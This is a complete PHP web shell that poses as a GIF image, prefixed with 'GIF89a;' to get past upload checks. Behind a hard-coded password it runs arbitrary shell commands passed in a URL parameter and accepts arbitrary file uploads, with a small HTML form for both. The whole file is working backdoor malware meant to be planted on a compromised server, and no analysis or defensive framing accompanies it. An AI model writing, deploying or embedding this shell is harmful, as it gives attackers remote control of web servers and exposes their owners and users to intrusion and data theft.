GIF89a;
<?php
// Advanced Web Shell with password protection
$password = "MySecretPass123";

if(!isset($_GET['pass']) || $_GET['pass'] !== $password){
    die("Access Denied");
}

echo "<html><body style='background:#000;color:#0f0;font-family:monospace;'>";
echo "<h2>Web Shell - Connected</h2>";

// Command execution
if(isset($_GET['cmd'])){
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
}

// File upload
if(isset($_FILES['file'])){
    $target = $_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo "[+] File uploaded: $target";
    } else {
        echo "[-] Upload failed";
    }
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" style="width:400px;">
    <input type="hidden" name="pass" value="<?php echo $password; ?>">
    <button type="submit">Execute</button>
</form>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="hidden" name="pass" value="<?php echo $password; ?>">
    <button type="submit">Upload</button>
</form>
</body></html>
